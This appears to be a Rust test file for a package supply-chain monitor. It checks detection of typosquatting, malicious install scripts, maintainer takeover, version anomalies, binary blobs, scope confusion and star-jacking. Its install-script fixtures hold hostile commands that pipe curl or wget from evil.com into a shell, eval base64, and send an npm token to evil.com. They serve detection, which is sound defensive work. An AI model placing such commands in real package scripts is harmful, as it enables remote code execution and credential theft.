use super::supply_chain_monitor::*;

fn make_monitor() -> SupplyChainMonitor {
    SupplyChainMonitor::new(MonitorConfig::default())
}

fn make_metadata(name: &str) -> PackageMetadata {
    PackageMetadata {
        name: name.to_string(),
        ..Default::default()
    }
}

// ─────────────────────────────────────────────
// Levenshtein distance tests
// ─────────────────────────────────────────────

#[test]
fn levenshtein_identical_strings() {
    assert_eq!(levenshtein_distance("lodash", "lodash"), 0);
}

#[test]
fn levenshtein_single_insertion() {
    assert_eq!(levenshtein_distance("lodash", "lodashs"), 1);
}

#[test]
fn levenshtein_single_deletion() {
    assert_eq!(levenshtein_distance("lodash", "lodas"), 1);
}

#[test]
fn levenshtein_single_substitution() {
    assert_eq!(levenshtein_distance("lodash", "lodesh"), 1);
}

#[test]
fn levenshtein_empty_string() {
    assert_eq!(levenshtein_distance("", "abc"), 3);
    assert_eq!(levenshtein_distance("abc", ""), 3);
    assert_eq!(levenshtein_distance("", ""), 0);
}

#[test]
fn levenshtein_two_edits() {
    // "kitten" -> "sitting" = 3 edits; "flaw" -> "lawn" = 2 edits
    assert_eq!(levenshtein_distance("flaw", "lawn"), 2);
}

#[test]
fn levenshtein_configurable_threshold() {
    let config = MonitorConfig::default().with_levenshtein_threshold(1);
    let monitor = SupplyChainMonitor::new(config);
    let meta = make_metadata("lodashs");
    let findings = monitor.check_typosquatting(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.indicator == AttackIndicator::Typosquatting),
        "should detect 1-distance typosquat"
    );

    let config_strict = MonitorConfig::default().with_levenshtein_threshold(0);
    let monitor_strict = SupplyChainMonitor::new(config_strict);
    let findings_strict = monitor_strict.check_typosquatting(&meta);
    let typosquat_by_distance: Vec<_> = findings_strict
        .iter()
        .filter(|f| f.description.contains("edit(s) away"))
        .collect();
    assert!(
        typosquat_by_distance.is_empty(),
        "should not detect with threshold=0"
    );
}

// ─────────────────────────────────────────────
// Typosquatting detection tests
// ─────────────────────────────────────────────

#[test]
fn typosquat_lodash_vs_lodahs() {
    let monitor = make_monitor();
    let meta = make_metadata("lodahs");
    let findings = monitor.check_typosquatting(&meta);
    assert!(!findings.is_empty(), "lodahs should trigger typosquatting");
    assert!(
        findings
            .iter()
            .any(|f| f.indicator == AttackIndicator::Typosquatting)
    );
}

#[test]
fn typosquat_express_vs_expresss() {
    let monitor = make_monitor();
    let meta = make_metadata("expresss");
    let findings = monitor.check_typosquatting(&meta);
    assert!(
        !findings.is_empty(),
        "expresss should trigger typosquatting"
    );
}

#[test]
fn typosquat_react_vs_reactt() {
    let monitor = make_monitor();
    let meta = make_metadata("reactt");
    let findings = monitor.check_typosquatting(&meta);
    assert!(!findings.is_empty(), "reactt should trigger typosquatting");
}

#[test]
fn typosquat_chalk_vs_chalks() {
    let monitor = make_monitor();
    let meta = make_metadata("chalks");
    let findings = monitor.check_typosquatting(&meta);
    assert!(!findings.is_empty(), "chalks should trigger typosquatting");
}

#[test]
fn typosquat_axios_vs_axois() {
    let monitor = make_monitor();
    let meta = make_metadata("axois");
    let findings = monitor.check_typosquatting(&meta);
    assert!(!findings.is_empty(), "axois should trigger typosquatting");
}

#[test]
fn typosquat_separator_swap_underscore_vs_dash() {
    let config = MonitorConfig {
        known_packages: vec!["my-cool-pkg".to_string()],
        ..Default::default()
    };
    let monitor = SupplyChainMonitor::new(config);
    let meta = make_metadata("my_cool_pkg");
    let findings = monitor.check_typosquatting(&meta);
    assert!(
        findings.iter().any(|f| f.description.contains("separator")),
        "separator swap my_cool_pkg/my-cool-pkg not detected: {:?}",
        findings,
    );
}

#[test]
fn typosquat_no_false_positive_for_exact() {
    let monitor = make_monitor();
    let meta = make_metadata("lodash");
    let findings = monitor.check_typosquatting(&meta);
    let distance_findings: Vec<_> = findings
        .iter()
        .filter(|f| f.description.contains("edit(s) away"))
        .collect();
    assert!(
        distance_findings.is_empty(),
        "exact match should not trigger"
    );
}

// ─────────────────────────────────────────────
// Install script detection tests
// ─────────────────────────────────────────────

#[test]
fn install_script_curl_pipe_sh() {
    let monitor = make_monitor();
    let mut meta = make_metadata("evil-pkg");
    meta.scripts.insert(
        "postinstall".into(),
        "curl http://evil.com/payload.sh | sh".into(),
    );
    let findings = monitor.check_install_scripts(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.indicator == AttackIndicator::SuspiciousInstallScript),
        "curl piped to sh not detected",
    );
}

#[test]
fn install_script_wget_pipe_bash() {
    let monitor = make_monitor();
    let mut meta = make_metadata("evil-pkg2");
    meta.scripts.insert(
        "preinstall".into(),
        "wget http://evil.com/malware -O- | bash".into(),
    );
    let findings = monitor.check_install_scripts(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.indicator == AttackIndicator::SuspiciousInstallScript),
        "wget piped to bash not detected",
    );
}

#[test]
fn install_script_base64_eval() {
    let monitor = make_monitor();
    let mut meta = make_metadata("encoded-pkg");
    meta.scripts.insert(
        "postinstall".into(),
        "echo ZXZpbGNvZGU= | base64 --decode | eval".into(),
    );
    let findings = monitor.check_install_scripts(&meta);
    assert!(
        findings.iter().any(|f| f.description.contains("base64")),
        "base64 eval not detected",
    );
}

#[test]
fn install_script_env_exfiltration() {
    let monitor = make_monitor();
    let mut meta = make_metadata("exfil-pkg");
    meta.scripts.insert(
        "postinstall".into(),
        "curl http://evil.com/steal?token=$npm_token".into(),
    );
    let findings = monitor.check_install_scripts(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.description.contains("exfiltrate")),
        "env exfiltration not detected",
    );
}

#[test]
fn install_script_safe_script_no_false_positive() {
    let monitor = make_monitor();
    let mut meta = make_metadata("safe-pkg");
    meta.scripts
        .insert("build".into(), "tsc && node build.js".into());
    let findings = monitor.check_install_scripts(&meta);
    assert!(findings.is_empty(), "build script should not trigger");
}

// ─────────────────────────────────────────────
// Maintainer takeover tests
// ─────────────────────────────────────────────

#[test]
fn maintainer_takeover_dormant_package() {
    let monitor = make_monitor();
    let mut meta = make_metadata("old-pkg");
    meta.days_since_last_publish = Some(500);
    meta.maintainers = vec![
        MaintainerInfo {
            name: "original-dev".into(),
            added_days_ago: 2000,
            is_original: true,
        },
        MaintainerInfo {
            name: "new-attacker".into(),
            added_days_ago: 5,
            is_original: false,
        },
    ];
    let findings = monitor.check_maintainer_takeover(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.severity == ThreatSeverity::Critical),
        "dormant takeover should be critical",
    );
}

#[test]
fn maintainer_new_on_active_package() {
    let monitor = make_monitor();
    let mut meta = make_metadata("active-pkg");
    meta.days_since_last_publish = Some(10);
    meta.maintainers = vec![
        MaintainerInfo {
            name: "original-dev".into(),
            added_days_ago: 500,
            is_original: true,
        },
        MaintainerInfo {
            name: "new-collaborator".into(),
            added_days_ago: 5,
            is_original: false,
        },
    ];
    let findings = monitor.check_maintainer_takeover(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.severity == ThreatSeverity::Medium),
        "new maintainer on active pkg should be medium",
    );
}

// ─────────────────────────────────────────────
// Version anomaly tests
// ─────────────────────────────────────────────

#[test]
fn version_anomaly_yanked() {
    let monitor = make_monitor();
    let mut meta = make_metadata("yanked-pkg");
    meta.yanked_versions = vec!["1.2.3".into(), "1.2.4".into()];
    let findings = monitor.check_version_anomalies(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.indicator == AttackIndicator::VersionAnomaly),
        "yanked versions not detected",
    );
}

#[test]
fn version_anomaly_major_jump() {
    let config = MonitorConfig::default().with_version_jump_threshold(5);
    let monitor = SupplyChainMonitor::new(config);
    let mut meta = make_metadata("jump-pkg");
    meta.previous_major_version = Some(2);
    meta.current_major_version = Some(15);
    let findings = monitor.check_version_anomalies(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.description.contains("version jump")),
        "major version jump not detected",
    );
}

#[test]
fn version_anomaly_normal_bump_no_flag() {
    let monitor = make_monitor();
    let mut meta = make_metadata("normal-pkg");
    meta.previous_major_version = Some(3);
    meta.current_major_version = Some(4);
    let findings = monitor.check_version_anomalies(&meta);
    let jump_findings: Vec<_> = findings
        .iter()
        .filter(|f| f.description.contains("version jump"))
        .collect();
    assert!(jump_findings.is_empty(), "normal bump should not flag");
}

// ─────────────────────────────────────────────
// Binary blob detection tests
// ─────────────────────────────────────────────

#[test]
fn binary_blob_exe_detected() {
    let monitor = make_monitor();
    let mut meta = make_metadata("binary-pkg");
    meta.has_binary_files = true;
    meta.binary_extensions_found = vec!["exe".into(), "dll".into()];
    let findings = monitor.check_binary_blobs(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.severity == ThreatSeverity::Critical),
        "exe/dll should be critical",
    );
}

#[test]
fn binary_blob_wasm_detected() {
    let monitor = make_monitor();
    let mut meta = make_metadata("wasm-pkg");
    meta.has_binary_files = true;
    meta.binary_extensions_found = vec!["wasm".into()];
    let findings = monitor.check_binary_blobs(&meta);
    assert!(
        findings.iter().any(|f| f.severity == ThreatSeverity::High),
        "wasm should be high",
    );
}

#[test]
fn binary_blob_no_binaries_clean() {
    let monitor = make_monitor();
    let meta = make_metadata("clean-pkg");
    let findings = monitor.check_binary_blobs(&meta);
    assert!(
        findings.is_empty(),
        "no binaries should produce no findings"
    );
}

// ─────────────────────────────────────────────
// Scope confusion tests
// ─────────────────────────────────────────────

#[test]
fn scope_confusion_collision() {
    let monitor = make_monitor();
    let mut meta = make_metadata("express");
    meta.scoped_name = Some("@attacker/express".into());
    let findings = monitor.check_scope_confusion(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.indicator == AttackIndicator::ScopeConfusion),
        "scope confusion not detected",
    );
}

#[test]
fn scope_confusion_scoped_matches_known_unscoped() {
    let monitor = make_monitor();
    let meta = make_metadata("@evil-scope/lodash");
    let findings = monitor.check_scope_confusion(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.indicator == AttackIndicator::ScopeConfusion),
        "scoped package matching known unscoped not detected",
    );
}

// ─────────────────────────────────────────────
// Star-jacking tests
// ─────────────────────────────────────────────

#[test]
fn star_jacking_mismatched_repos() {
    let monitor = make_monitor();
    let mut meta = make_metadata("fake-lodash");
    meta.repository_url = Some("https://github.com/attacker/fake-lodash".into());
    meta.readme_repo_url = Some("https://github.com/lodash/lodash".into());
    let findings = monitor.check_star_jacking(&meta);
    assert!(
        findings
            .iter()
            .any(|f| f.indicator == AttackIndicator::StarJacking),
        "star-jacking not detected",
    );
}

#[test]
fn star_jacking_matching_repos_no_flag() {
    let monitor = make_monitor();
    let mut meta = make_metadata("real-pkg");
    meta.repository_url = Some("https://github.com/owner/real-pkg".into());
    meta.readme_repo_url = Some("https://github.com/owner/real-pkg".into());
    let findings = monitor.check_star_jacking(&meta);
    assert!(findings.is_empty(), "matching repos should not flag");
}

// ─────────────────────────────────────────────
// Full analyze integration tests
// ─────────────────────────────────────────────

#[test]
fn full_analyze_catches_multiple_indicators() {
    let monitor = make_monitor();
    let mut meta = make_metadata("expresss");
    meta.has_binary_files = true;
    meta.binary_extensions_found = vec!["so".into()];
    meta.scripts
        .insert("postinstall".into(), "curl http://evil.com/x | bash".into());
    let findings = monitor.analyze(&meta);
    let indicators: std::collections::HashSet<_> = findings.iter().map(|f| f.indicator).collect();
    assert!(indicators.contains(&AttackIndicator::Typosquatting));
    assert!(indicators.contains(&AttackIndicator::BinaryBlob));
    assert!(indicators.contains(&AttackIndicator::SuspiciousInstallScript));
}

#[test]
fn full_analyze_clean_package_no_findings() {
    let monitor = make_monitor();
    let meta = make_metadata("my-unique-internal-pkg-xyz");
    let findings = monitor.analyze(&meta);
    assert!(findings.is_empty(), "clean package should have no findings");
}
